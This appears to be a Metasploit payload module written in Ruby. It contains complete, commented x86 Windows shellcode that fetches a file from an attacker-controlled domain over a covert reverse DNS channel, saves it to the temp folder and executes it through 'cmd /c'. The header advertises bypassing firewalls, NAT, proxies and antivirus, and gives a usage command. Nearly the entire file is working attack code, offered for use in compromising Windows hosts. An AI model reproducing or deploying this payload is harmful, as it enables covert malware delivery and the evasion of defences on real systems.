#################################################################
# Shellcode/Payload for Win x86: download and execute file via reverse DNS channel
#################################################################
# 
# Features:
# * Windows 7/8.1/10 tested
# * UAC without work (svchost.exe makes requests via getaddrinfo)
# * Firewall/Router/Nat/Proxy bypass reverse connection (like dnscat do, but without sockets and stable!)
# * No TXT DNS section used, so it is faster then TXT version (when we are talking about downloading binaries)
# * NO open SOCKETs from exploited process (svchost doing all DNS request FOR YOU!, so Network/AV bypases)
#
#
# Download speed:                    ~ 4 kb/sec
# Maximum size of file for donwload: ~ 88Mb
# Shellcode size: 833 bytes (no null bytes)
#
# Usage example: root@kali:~# msfpayload windows/dnsshell DOMAIN=dom.ws FILE=vbs J | sed -s 's/\%/\\/g'
#   # dom.ws -- domain you control and NS records points to DNS handler
#   # FILE - could be any, but if 'vbs' then 'wscript' will be used for execution
#
# DNS handler - https://github.com/eik00d/Reverse_DNS_Shellcode
#
# More details: https://github.com/eik00d/Reverse_DNS_Shellcode/README.md
#
# Support binaries and wscript/vbs type of 'drops'
# Based on previous version: https://erpscan.com/wp-content/uploads/2012/06/dns-for-evil.pdf
#
# What's new here?
#    - Before this shellcode was limited in usage because if NO IPv6 address assigned to the interface then it was impossible
#       to resolve a IPv6 IP by using WinApi (WSANO_DATA error). But if we are resolving IPv6 addresses from reserved list then we could do it!
#       SO shellcode and DNS handler C&C have been changed to address that
#    - Extended maximum file size for download over reverse DNS, up to 88 Mb
#
# By Alexey Sintsov
#     alex.sintsov [sobachka] gmail.com
#     dookie [sobachka] inbox.ru
#
# P.S. Works with  Windows 7/8/10
#       do not work in XP/2003 because there are no IPv6 by default.
#       but can work in XP/2003 if IPv6 installed
#       (it is not need to be enabled, just installed)      
#
# 

require 'msf/core'

module Metasploit3

	include Msf::Payload::Windows
	include Msf::Payload::Single

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'DNS_DOWNLOAD_EXEC',
			'Version'       => '1.00',
			'Description'   => 'Download and Exec (via DNS)',
			'Author'        => [ 'Alexey Sintsov' ],
			'License'       => MSF_LICENSE,
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'Payload'       =>
				{
					'Offsets' =>{ },
					
					'Begin' => "\xEB\x02" +                  # 1. Jump to CALL
                    "\xEB\x7A" +                  # 3. Now in stack we have EIP, but jump to 4.
                    "\xE8\xF9\xFF\xFF\xFF" +      # 2. CALL -1 (to get current address)
                    
                    # Functions List A: List of needed WinApi functions 
                    "GetProcAddress\xFF" +        
                    "GetTempPathA\xFF" +          
                    
                    "\xFF\xFF\xFF\xFF\xFF\xFF\xFF" + 
                    
                    "WinExec\xFF" + 
                    "ExitThread\xFF" + 
                    "LoadLibraryA\xFF" + 
                    "ws2_32\xFF" + 
                    "WSAStartup\xFF" + 
                    "getaddrinfo\xFF" + 
                    "msvcrt\xFF" + 
                    "fopen\xFF" + 
                    "fwrite\xFF" + 
                    "\xEB\x13" +        # 4. Jump here, maximum jump... so we re-jump from here to 5.
                    "fclose\xFF", 
					
					'Payload1' => "\xFF" + 	# LoadLibraries and functions                  
                    "\x5e" + # 5. POP ESI  ; now in ESI we have saved pointer (pointer to Function list A)
                    "\x33\xC9" + # XOR ECX, ECX
                    "\xB1\xE4" + # MOV CL, 0xE4
                    "\x8B\xD1" + # MOV EDX, ECX
                    "\x2B\xE2" + # SUB ESP, EDX ; ESP = ESP = 0xE4. just save some place in stack
                    "\x8B\xFC" + # MOV EDI, ESP
                    "\xF3\xA4" + # REP MOVS byte:[EDI], [ESI] ; Copy Function list A to the STACK
                    "\x33\xc0" + # XOR EAX, EAX
                    "\x8b\xfc" + # MOV EDI, ESP
                    "\x8A\x04\x39" + # ContinueLoop1: MOV al, byte:[ECX + EDI] ; read one byte of func name (until 0xFF)
                    "\x3A\xCA" + # CMP CL, DL ; List finished?
                    "\x74\x0D" + # JE FinishLoop1
                    "\x3C\xFF" + # CMP AL, 0xFF ; end of the func name ?
                    "\x74\x03" + # JE NextLoop1
                    "\x41" +    # INC ECX ; Next byte of func name
                    "\xEB\xF2" + # JE ContinueLoop1
                    "\x88\x2C\x39" + # NextLoop1: MOV byte:[ECX + EDI], CH ; Put null on 0xFF (now we have ANSI C strings list of function names)
                    "\x41" +    # INC ECX
                    "\xEB\xEC" + # JMP ContimueLoop1
                    "\xEB\x78" + # FinishLoop1: JMP FinishLoop2
                    
                    "\x31\xC9" + # FuncGetAddr(func_name): XOR ECX, ECX 
                    "\x64\x8B\x71\x30" + # MOV ESI, FS:[ECX + 0x30]
                    "\x8B\x76\x0C" + # MOV ESI, [ESI + 0x0C]
                    "\x8B\x76\x1C" + # MOV ESI, [ESI + 0x1C]
                    "\x8B\x5e\x08" + # NextFunx: MOV EBX, [ESI + 0x08]
                    "\x8B\x7E\x20" + # MOV EDI, [ESI + 0x20]
                    "\x33\xed" +    #  XOR EBp, EBp
                    "\x83\xc5\x18" + # ADD EBP, 18
                    "\x8B\x36" +    #  MOV ESI, [ESI]
                    "\x66\x39\x0C\x2F" + #  CMP [EDI + EBP], CX
                    "\x75\xed" +    # JNE NextFunc
                    "\x8B\x73\x3C" + #  MOV ESI, [EBX, 0x3C]
                    "\x8B\x74\x1E\x78" + #  MOV ESI, [ESI + EBX + 0x78]
                    "\x03\xF3" +    #  ADD ESI, EBX
                    "\x8B\x7E\x20" + #  MOV EDI, [ESI + 0x20]
                    "\x03\xFB" +    #  ADD EDI, EBX
                    "\x8B\x4E\x14" + #  MOV ECX, [ESI + 0x14]
                    "\x33\xED" +    # XOR EBP, EBX
                    "\x56" + #  PUSH ESI
                    "\x57" + #  Next: PUSH EDI
                    "\x51" + #  PUSH ECX
                    "\x8B\x3F" + #  MOV EDI, [EDI]
                    "\x03\xFB" + #   ADD EDI, EBX
                    "\x8B\xF2" + #  MOV ESI, EDX
                    "\x6A\x0E" + #  PUSH 0x0E
                    "\x59" +    #  POP ECX
                    "\xF3\xA6" + #  REPE CMPS byte [ESI], [EDI]
                    "\x74\x08" + #  JE ExitLoop
                    "\x59" +    #  POP ECX
                    "\x5F" +    #  POP EDI
                    "\x83\xC7\x04" + #  ADD EDI, 4
                    "\x45" +        #  INC EBP
                    "\xE2\xE9" +    #  LOOP Next
                    "\x59" +    #  ExitLoop: POP ECX
                    "\x5F" +    #  POP EDI
                    "\x5E" +     #  POP ESI
                    "\x8B\xCD" + #  MOV ECX, EBP
                    "\x8B\x46\x24" + #  MOV EAX, [ESI + 0x24]
                    "\x03\xC3" + #  ADD EAX, EBX
                    "\xD1\xE1" + #  SHL ECX,1
                    "\x03\xC1" + #  ADD ECX, EAX
                    "\x33\xC9" + #  XOR ECX, ECX
                    "\x66\x8B\x08" + #  MOV CX, [EAX]
                    "\x8B\x46\x1C" + #  MOV EAX, [ESI + 0x1C]
                    "\x03\xC3" + #  ADD EAX, EBX
                    "\xC1\xE1\x02" + #  SHL ECX, 2
                    "\x03\xC8" + #  ADD ECX, EAX
                    "\x8B\x01" + #  MOV EAX, [ECX]
                    "\x03\xC3" + #  ADD EAX, EBX
                    "\x8B\xFA" + #  MOV EDI, EDX
                    "\x8B\xF7" + #  MOV ESI, EDI
                    "\x83\xC6\x0E" + #  ADD ESI, 0x0E
                    "\x8B\xD0" + #  MOC EDX, EAX
                    "\x6A\x04" + #  PUSH 4
                    "\x59" + #  POP ECX
                    "\xC3" + # RET 
                    "\x8b\xd4" + #  FinishLoop2: MOV EDX, ESP
                    "\xe8\x81\xff\xff\xff" + #  CALL FuncGetAddr(func_name) ; func name in stack
                    
                    "\x50" + # PUSH EAX ; Address of GetProcAddress in EAX now
                    "\x33\xc0" + # XOR EAX, EAX
                    "\xb0\x0f" + # MOV AL, 0x0F
                    "\x03\xf8" + # ADD EDI, EAX
                    "\x57" + # PUSH EDI
                    "\x53" + # PUSH EBX
                    "\xff\xd2" + # CALL EDX ; GetProcAddress("GetTempPathA")
                    "\x50" + # PUSH EAX ; GetTempPathA in EAX, let's put it in the stack
                    "\x33\xc0" + # XOR eAX, EAX
                    "\xb0\x14" + # MOV AL, 0x14
                    "\x03\xf8" + # ADD EDI, EAX
                    "\x57" + # PUSH EDI
                    "\x53" + # PUSH EBX
                    "\xff\x54\x24\x0c" + # CALL GetProcAddress("WinExec")
                    "\x50" + # PUSH EAX
                    "\x33\xc0" + # XOR EAX, EAX
                    "\xb0\x08" + # MOV AL, 0x08
                    "\x03\xf8" + # ADD EDI, EAX
                    "\x57" + # PUSH EDI
                    "\x53" + # PUSH EBX
                    "\xff\x54\x24\x10" + # CALL GetProcAddress("ExitThread")
                    "\x50" + # PUSH EAX
                    "\x33\xc0" + # XOR EAX, EAX
                    "\xb0\x0b" + # MOV AL, 0x0B
                    "\x03\xf8" + # ADD EDI, EAX
                    "\x57" + # PUSH EDI
                    "\x53" + # PUSH EBX                    
                    "\xff\x54\x24\x14" + # CALL GetProcAddress("LoadLibraryA")
                    "\x50" + # PUSH EAX
                    "\x8b\xc7" + # MOV EAX, EDI
                    "\x83\xc0\x0d" + # ADD EAX, 0x0D
                    "\x50" + # PUSH EAX
                    "\xff\x54\x24\x04" + # CALL LoadLibraryA("ws2_32")
                    "\x8b\xd8" + # MOV EBX, EAX
                    "\x33\xc0" + # XOR EAX, EAX
                    "\xb0\x14" + # MOV AL, 0x14
                    "\x03\xf8" + # ADD EDI, EAX
                    "\x57" + # PUSH EDI
                    "\x53" + # PUSH EBX
                    "\xff\x54\x24\x18" + # CALL GetProcAddress("WSAStartup")
                    "\x50" + # PUSH EAX
                    "\x33\xc0" + # XOR EAX, EAX
                    "\xb0\x0b" + # MOV AL, 0x0B
                    "\x03\xf8" + # ADD EDI, EAX
                    "\x57" + # PUSH EDI
                    "\x53" + # PUSH EBX
                    "\xff\x54\x24\x1C" + # CALL GetProcAddress("getaddrinfo")
                    "\x50" + # PUSH EAX
                    "\x83\xc7\x0c" + # ADD EDI, 0x0C
                    "\x57" + # PUSH EDI
                    "\xff\x54\x24\x0c" + # CALL LoadLibraryA("msvcrt")
                    "\x8b\xd8" + # MOV EBX, EAX
                    "\x83\xc7\x07" + # ADD EDI 0x07
                    "\x57" + # PUSH EDI
                    "\x53" + # PUSH EBX
                    "\xff\x54\x24\x20" + # CALL GetProcAddress("fopen")
                    "\x50" + # PUSH EAX
                    "\x83\xc7\x06" + # ADD EDI, 0x07
                    "\x57" + # PUSH EDI
                    "\x53" + # PUSH EBX
                    "\xff\x54\x24\x24" + # CALL GetProcAddress("fwrite")
                    "\x50" + # PUSH EAX
                    "\x50" + # PUSH EAX
                    "\x8b\xf4" + # MOV ESI, ESP
                    "\x83\xc7\x09" + # ADD EDI, 9
                    "\x57" + # PUSH EDI
                    "\x53" + # PUSH EBX
                    "\xff\x54\x24\x2c" + # CALL GetProcAddress("fclose")
                    "\x50" + # PUSH EAX
                    "\x33\xc0" + # XOR EAX, EAX
                    "\xb4\x03" + # MOV AH, 0x03
                    "\x2b\xe0" + # SUB ESP, EAX ; Now we have all function, let's prepare env
                    "\x8b\xcc" + # MOV ECX, ESP
                    "\x51" + # PUSH ECX
                    "\x50" + # PUSH EAX
                    "\xff\x56\x20" + # CALL GetTempPathA() ; First get path to %temp%
                    "\x03\xe0" + # ADD ESP, EAX
                    "\x59" + # POP ECX
                    "\x59" + # POP ECX
                    "\x8b\xc8" + # MOV ECX, EAX
                    "\xb8", # MOV EAX, EXTENSION+0x01010101 (EXT param)
					
					'Payload2' => "\xba\x01\x01\x01\x01" + # MOV EDX, 0x01010101
                    "\x2b\xc2" + # SUB EAX, EDX
                    "\x50" + # PUSH EAX ; Here we have our drop-file extension
                    "\xb8\x79\x78\x6f\x2e" + # MOV EAX, 0x2E6F7879 ; 'yxo' 
                    "\x50" + # PUSH EAX; full path for frop: %temp%/yxo.<EXTENSION>
                    "\x2b\xe1" + # SUB ESP, ECX
                    "\x8b\xcc" + # MOV ECX, ESP
                    "\x33\xc0" + # XOR EAX, EAX
                    "\xb0\x77" + # MOV AL, 0x77
                    "\xb4\x62" + # MOV AH, 0x62
                    "\x50" + # PUSH EAX 
                    "\x54" + # PUSH ESP 
                    "\x51" + # PUSH ECX
                    "\xff\x56\x08" + # CALL fopen(%temp%/yxo.<EXTENSION>) "\x33\xd2" + # XOR EDX, EDX
                    "\x33\xd2" + # xor    edx,edx
                    "\xb6\x03" + # MOV DH, 3
                    "\xb2\x0c" + # MOV DL, 0x0C
                    "\x03\xe2" + # ADD ESP, EDX
                    "\x50" + # PUSH EAX
                    "\x33\xc0" + # XOR EAX, EAX
                    "\xb4\x05" + # MOV AH, 5
                    "\x2b\xe0" + # SUB ESP, EAX
                    "\x54" + # PUSH ESP
                    "\x33\xc0" + # XOR EAX, EAX
                    "\xb0\x02" + # MOV AL 2
                    "\xb4\x02" + # MOV AH 2
                    "\x50" + # PUSH EAX
                    "\xff\x56\x10" + # CALL WSAStartup()
                    "\x32\xc9" + # XOR  CL, CL
                    "\x50" + # MoreSpace: PUSH EAX ; Pushing palce for structure
                    "\x80\xf9\x80" + # CMP CL 80
                    "\x74\x04" + # JE Continue
                    "\xfe\xc1" + # INC CL
                    "\xeb\xf6" + # JMP MoreSpace
                    "\x83\xc4\x10" + # ADD ESP, 10
                    "\xb0\x06" + # MOV AL, 6
                    "\x50" + # PUSH EAX
                    "\xb0\x01" + # MOV AL, 1
                    "\x50" + # PUSH EAX
                    "\xb0\x17" + # MOV AL, 17
                    "\x50" + # PUSH EAX
                    "\x83\xec\x04" + # SUB ESP, 4
                    "\x8B\xEC" + # MOV EBP, ESP
                    "\x83\xC7\x07" + # ADD EDI, 7
                    "\x83\xEC\x20" + # SUB ESP, 20
                    "\x33\xC0" + # XOR EAX, EAX
                    "\x8A\x0C\x38" + # Again: MOV CL, [EAX + EDI]
                    "\x88\x0C\x04" + # MOV byte:[ESP + EAX], CL
                    "\x40" + # INC EAX
                    "\x84\xC9" + # TEST CL, CL
                    "\x75\xF5" + # JNE Again ; This loop do a copy of DOMAIN name into stack
                    "\x33\xc0" + # XOR EAX, EAX
                    "\xb9\x61\x61\x61\x61" + # MOV ECX, 0x61616161 ; this is "aaaa"
                    "\x8b\xd9" + # MOV ENX, EcX
                    "\x51" + # PUSH ECX ; now in stack: "aaaa.DOMAIN"
                    "\x8b\xd4" + # NextDomainRequest: MOV EDX, ESP
                    "\x83\xc2\x7f" + # ADD EDX, 0x7F
                    "\x52" + # PUSH EDX
                    "\x33\xd2" + # XOR EDX, EDX
                    "\x55" + # PUSH EBP
                    "\x52" + # PUSH EDX
                    "\x8b\xd4" + # NextDomainRequest2: MOV EDX, ESP
                    "\x83\xc2\x0c" + # ADD EDX, 0x0C
                    "\x52" + # PUSH EDX
                    "\xff\x56\x0c" + # CALL getaddrinfo()
                    "\x59" + # POP ECX
                    "\x51" + # PUSH ECX
                    "\x85\xc0" + # TEST EAX, EAX ; Let's sure that we got DNS reponse
                    "\x75\xe7" + # JNE NextDomainRequest2; if not then repeat request
                    "\x33\xDB" + # XOR EBX, EBX
                    "\xB3\xee" + # MOV BL, 0xEE ; maximum size of data we can get from one request - 0xEE
                    "\x2B\xE3" + # SUN ESP, EBX
                    "\x50" + # PUSH EAX
                    "\x8b\xc5" + # MOV EAX, EBP
                    "\x8b\x40\x5b" + # MOV EAX, [EAX + 0x5B]
                    "\x8b\x48\x18" + # MOV EAX, [EAX + 0x018]
                    "\x8b\x50\x1c" + # MOV EAX, [EAX, 0x1C] ; Response structure parsing
                    "\x83\xC1\x08" + # ADD ECX, 8
                    "\x33\xC0" + # XOR EAX, EAX
                    "\x33\xFF" + # XOR EDI, EDI
                    "\x66\x8B\x01" + # MOV AX, [ECX]; Copy first for first IPv6 addres first two bytes (control bytes)
                    "\xc1\xe8\x08" + # SHR EAX, 8
                    "\x3C\xEF" + # CMP AL, 0xEF; Check if this is last piece of data
                    "\x72\x06" + # JB NotLast1
                    "\x8b\xf8" + # MOV EDI, EAX
                    "\x31\xC0" + # XOR EAX, EAX
                    "\xeb\x04" + # JMP LastAction
                    "\x5F" + # NotLast1: POP EDI
                    "\x83\xC7\x0E" + # ADD EDI, 0x0E; Increment  size value we received
                    "\x57" + # LastAction: PUSH EDI; save size or flag (if last)
                    "\x66\x8B\x59\x02" + # MOV BX, [ECX + 2]           ; Let's copy data with size 0x0E bytes from IPv6
                    "\x66\x89\x5c\x04\x04" + # MOV [ESP + EAX + 4], BX
                    "\x8B\x79\x04" + # MOV EDI, [ECX + 4]
                    "\x89\x7C\x04\x06" + # MOV [ESP + EAX + 6],  ESI
                    "\x8B\x79\x08" + # MOV EDI, [ECX + 8]
                    "\x89\x7C\x04\x0A" + # MOV [ESP + EAX + 0x0C], EDI
                    "\x8B\x79\x0C" + # MOV EDI, [ECX + 0x0C]
                    "\x89\x7C\x04\x0E" + # MOV [ESP + EAX + 0x0E], EDI
                    "\x8b\xc2" + # MOC EDX, EAX
                    "\x85\xc0" + # TEST EAX, EAX; Is this last IP in the response?
                    "\x75\xba" + # JNE NextIP; if not, then let's get another IP
                    "\x58" + # POP EAX; If yes, then let's write data block into the file
                    "\x89\xC2" + # MOV EDX, EAX
                    "\x52" + # PUSH EDX
                    "\xff\x76\xf8" + # PUSH [ESI - 8]
                    "\x80\xFA\xEF" + # CMP DL, 0xEF
                    "\x72\x02" + # JB NotLast2
                    "\x24\x0F" + # AND AL, 0x0f ; ok, this is last piece, then clean flag and let's have only size
                    "\x50" + # NotLast2: PUSH EAX
                    "\xb0\x01" + # MOV AL, 1
                    "\x50" + # PUSH EAX
                    "\x8b\xc4" + # MOV EAX, ESP
                    "\x83\xc0\x10" + # ADD, EAX, 0x10
                    "\x50" + # PUSH EAX
                    "\xff\x56\x04" + # CALL fwrite()
                    "\x58\x58\x58\x58" + # POP EAX /POP EAX /POP EAX / POP EAX
                    "\x5a" + # POP EDX
                    "\x33\xc0" + # XOR EAX EAX
                    "\xb0\xee" + # MOV AL, 0x0E
                    "\x03\xe0" + # ADD ESP, EAX
                    "\x80\xFA\xEF" + # CMP DL, 0xEF; Again, is that last piece?
                    "\x72\x02" + # JB GenerateNextDomainName
                    "\xeb\x2f" + # JMP Finish
                    "\x58" + # POP EAX; get domain name (first was 'aaaa')
                    "\xFE\xC0" + # INC AL; make it 'baaa' increment to next pack of IPv6 with nex 0xEE (or less) bytes of data
                    "\x3C\x7B" + # CMP AL, 0x7B; zaaaa ? then go to abaaa 
                    "\x75\x22" + # JMP IncDone
                    "\xB0\x61" + # MOV AL, 0x61
                    "\xFE\xC4" + # INC AH
                    "\x80\xFC\x7B" + # CMP AH 0x7B
                    "\x75\x19" + # JMP IncDone
                    "\xB4\x61" + # MOV AH 0x61
                    "\x89\xC1" + # MOV ECX, EAX
                    "\xC1\xE9\x10" + # SHR ECX 0x10
                    "\xFE\xC1" + # INC CL
                    "\x80\xF9\x7B" + # CMP CL 0x7B
                    "\x75\x04" + # JNE IncDone2
                    "\xB1\x61" + # MOV CL, 0x61
                    "\xFE\xC5" + # INC CH
                    "\xC1\xE1\x10" + # SHR ECX 0x10
                    "\x66\x89\xC1" + # MOV CX, AX
                    "\x91" + # XCHG EAX,ECX
                    "\x50" + # PUSH EAX ; new subdomain ready
                    "\xe9\x39\xff\xff\xff" + # JMP  NextDomainRequest
                    
                    "\x8b\x46\xf8" + # MOV EAX, [ESI - 8]
                    "\x50" + # PUSH EAX
                    "\xff\x56\xfc" + # CALL fclose()
                    "\x66\xb8\x34\x04" + # MOV AX, 0x434
                    "\x03\xe0" + # ADD ESP, EAX ; back to the path to file we just created
                    "\x68\x2f\x63\x20\x22" + # PUSH cmd 
                    "\x68\x63\x6d\x64\x20" + # PUSH /c " ; so we have 'cmd /c %temp%/yxo.EXT'
                    "\x8b\xcc" + # MOV ECX, ESP
                    "\x41" + # NextByte: INC ECX
                    "\x8a\x01" + # MOV AL, [ECX]
                    "\x84\xc0" + # TEST AL,AL
                    "\x75\xf9" + # JNE NextByte
                    "\xc6\x01\x22" + # MOV byte:[ECX], 0x22; Last " to close string for cmd /c
                    "\x88\x41\x01" + # MOV [ECX + 1], AL; FInish with null byte
                    "\x33\xc0" + # XOR EAX, EAX
                    "\x8b\xcc" + # MOV ECX, ESP
                    "\x50" + # PUSH EAX
                    "\x51" + # PUSH ECX
                    "\xff\x56\x1c" + # CALL WinExec
                    "\x50" + # PUSH EAX
                    "\xff\x56\x18" # CALL ExitThread 
					
				}
			))

		# We are using rtlExitThread(0)
		deregister_options('EXITFUNC')

		# Register the domain and cmd options
		register_options(
			[
				OptString.new('DOMAIN', [ true, "The domain name to use (9 bytes - maximum)" ]),
				OptString.new('EXT', [ true, "Filename extension (default VBS)" ]),
			], self.class)
	end

	#
	# Constructs the payload
	#
	def generate_stage
		domain  = datastore['DOMAIN'] || ''
		extens  = datastore['EXT'] || 'vbs'
		
		# \"x66\x79\x66\x01"
		extLen=extens.length
		
		while extens.length<4
			extens=extens+"\x01"
		end
		
		i=0
		while i<extLen
			extens[i,1]=(extens[i].ord+1).chr
			i=i+1
		end
		
		while domain.length<10
			domain=domain + "\xFF"
		end
		
		domain="\x2e"+domain
		
		payload=module_info['Payload']['Begin'] + domain + module_info['Payload']['Payload1'] + extens + module_info['Payload']['Payload2']
				
		return payload
	end

end
